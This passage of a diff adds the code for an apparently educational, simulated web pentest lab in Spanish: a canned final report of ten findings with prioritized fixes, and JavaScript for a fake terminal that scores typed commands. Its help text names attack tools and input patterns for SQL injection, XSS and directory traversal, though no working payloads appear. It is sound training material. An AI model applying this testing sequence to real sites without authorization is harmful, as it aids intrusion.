+   Fix: Serve via web server deny rules
+
+#9 [ALTO] phpinfo() Exposed
+   Severity: CVSS 5.3 | OWASP A05:2021
+   Impact: Información detallada del sistema
+   Fix: Remove debug endpoints in production
+
+#10 [MEDIO] Weak Security Headers
+   Severity: CVSS 4.3 | OWASP A05:2021
+   Impact: CSP con unsafe-inline/eval
+   Fix: Restrict CSP, add HSTS, X-Frame-Options
+
+🛡️ RECOMENDACIONES PRIORIZADAS
+────────────────────────────────
+URGENTE (24h):
+1. Eliminar config.php.bak y .env del servidor
+2. Parchar SQLi con prepared statements
+3. Rotar TODAS las credenciales comprometidas
+4. Eliminar phpinfo() y debug endpoints
+
+CORTO PLAZO (1 semana):
+5. Implementar WAF (ModSecurity / Cloudflare)
+6. Output encoding para XSS
+7. File access validation (whitelist)
+8. Security headers (HSTS, CSP estricto)
+
+LARGO PLAZO (1 mes):
+9. Code review completo
+10. Penetration test programático (CI/CD)
+
+═══════════════════════════════════════════════════════════════════════
+                    ✅ LAB COMPLETADO — ¡FELICIDADES!
+═══════════════════════════════════════════════════════════════════════`
+        },
+        completionCheck: (cmd) => cmd.includes("report"),
+        vulns: []
+      }
+    ];
+
+    const terminal = document.getElementById('terminal-output');
+    const input = document.getElementById('terminal-input');
+
+    function scrollToBottom() { terminal.scrollTop = terminal.scrollHeight; }
+    function addLine(text, className = 'output') {
+      const div = document.createElement('div');
+      div.className = className;
+      div.textContent = text;
+      terminal.appendChild(div);
+      scrollToBottom();
+    }
+    function addPromptLine(cmd) {
+      const div = document.createElement('div');
+      div.className = 'prompt-line';
+      div.innerHTML = `<span class="prompt-symbol">pentester@web:~$</span> <span class="command">${escapeHtml(cmd)}</span>`;
+      terminal.appendChild(div);
+      scrollToBottom();
+    }
+    function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
+
+    function addVulns(vulns) {
+      const container = document.getElementById('vuln-panels');
+      if (vulnCount === 0) container.innerHTML = '';
+      const card = document.createElement('div');
+      card.className = 'vuln-card';
+      card.innerHTML = `<h4>${tasks[currentTask].title}</h4>`;
+      vulns.forEach(v => {
+        const div = document.createElement('div');
+        div.style.cssText = 'padding:0.3rem 0;border-bottom:1px solid rgba(255,255,255,0.05);';
+        div.innerHTML = `<span class="severity-${v.severity}">[${v.severity.toUpperCase()}]</span> <strong>${v.name}</strong><br><span style="font-size:0.7rem;color:var(--text-secondary)">${v.desc}</span>`;
+        card.appendChild(div);
+        vulnCount++;
+      });
+      container.appendChild(card);
+      document.getElementById('vuln-count').textContent = vulnCount;
+    }
+
+    function selectTask(index) {
+      document.querySelectorAll('.task-item').forEach(t => t.classList.remove('active'));
+      const taskEl = document.querySelector(`.task-item[data-task="${index}"]`);
+      if (taskEl && !taskEl.classList.contains('completed')) taskEl.classList.add('active');
+      currentTask = index;
+      addLine('');
+      addLine(`📋 Paso ${index + 1}: ${tasks[index].title}`, 'info');
+    }
+
+    function completeTask(index) {
+      if (completedTasks.has(index)) return;
+      completedTasks.add(index);
+      score += tasks[index].xp;
+      const taskEl = document.querySelector(`.task-item[data-task="${index}"]`);
+      taskEl.classList.add('completed');
+      taskEl.classList.remove('active');
+      document.getElementById('score').textContent = score;
+      document.getElementById('progress-badge').textContent = `${completedTasks.size}/7 completado`;
+      if (tasks[index].vulns.length > 0) addVulns(tasks[index].vulns);
+      if (index < tasks.length - 1) selectTask(index + 1);
+      else {
+        addLine('');
+        addLine('═══════════════════════════════════════════════════', 'success');
+        addLine('  🎉 ¡¡FELICIDADES!! ¡Lab Web Security completado!', 'success');
+        addLine(`  Vulnerabilidades: ${vulnCount} encontradas`, 'success');
+        addLine(`  Puntuación final: ${score} XP`, 'success');
+        addLine('═══════════════════════════════════════════════════', 'success');
+      }
+    }
+
+    function processCommand(cmd) {
+      addPromptLine(cmd);
+      commandHistory.push(cmd);
+      historyIndex = commandHistory.length;
+      const trimmed = cmd.trim().toLowerCase();
+
+      if (trimmed === 'help') {
+        addLine('Comandos Web Security:', 'info');
+        addLine('  whatweb / nikto / wappalyzer  — Fingerprinting', 'output');
+        addLine('  sqlmap                        — SQL Injection', 'output');
+        addLine('  xsser / curl + <script>       — XSS testing', 'output');
+        addLine('  dirsearch / curl ../../       — Directory traversal', 'output');
+        addLine('  report                        — Generate report', 'output');
+        addLine('  hint / clear                  — Help / Clean', 'output');
+        return;
+      }
+      if (trimmed === 'hint') {
+        addLine(`💡 Paso ${currentTask + 1}: ${tasks[currentTask].title}`, 'warning');
+        return;
+      }
+      if (trimmed === 'clear') { terminal.innerHTML = ''; return; }
+
+      const task = tasks[currentTask];
+      let response = null;
+      for (const [key, val] of Object.entries(task.responses)) {
+        if (key === '_default_report') continue;
+        if (cmd.trim().toLowerCase().includes(key.toLowerCase().split(' ')[0])) { response = val; break; }
+      }
+      if (!response && task.responses['_default_report']) response = task.responses['_default_report'];
+
+      if (response) {
+        response.split('\n').forEach(line => addLine(line, 'output'));
+        if (task.completionCheck(cmd.trim())) {
+          setTimeout(() => {
+            addLine('');
+            addLine(`✅ ¡Tarea completada! +${task.xp} XP`, 'success');
+            completeTask(currentTask);
+          }, 500);
+        }
+      } else {
+        addLine(`bash: ${cmd.split(' ')[0]}: command not found`, 'error');
+        addLine(`💡 Escribe "help" para ver comandos disponibles`, 'warning');
+      }
+    }
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        const cmd = input.value.trim();
+        if (cmd) { processCommand(cmd); input.value = ''; }
+      } else if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (historyIndex > 0) { historyIndex--; input.value = commandHistory[historyIndex]; }
+      } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (historyIndex < commandHistory.length - 1) { historyIndex++; input.value = commandHistory[historyIndex]; }
+        else { historyIndex = commandHistory.length; input.value = ''; }
+      }
+    });
+
+    document.querySelector('.terminal-panel').addEventListener('click', () => input.focus());
+    selectTask(0);
+  </script>
+</body>
+</html>
